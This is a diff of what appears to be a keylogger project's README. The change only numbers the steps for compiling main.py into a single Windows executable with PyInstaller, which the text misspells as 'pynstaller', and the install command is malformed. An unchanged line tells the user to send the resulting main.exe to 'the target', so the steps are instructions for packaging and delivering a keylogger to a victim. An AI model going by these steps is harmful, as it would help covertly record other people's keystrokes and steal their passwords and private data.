@@ -36,9 +36,9 @@ Stopping the Keylogger:
 
 Last but not least here is how you will compile the file
 ## step 1
-pip pynstaller
-pynstaller main.py --onefile
-cd dist 
-dir or ls to list files 
-main.exe 
+1) pip pynstaller
+2) pynstaller main.py --onefile
+3) cd dist 
+4) dir or ls to list files 
+5) main.exe 
 ## send the main.exe to the target
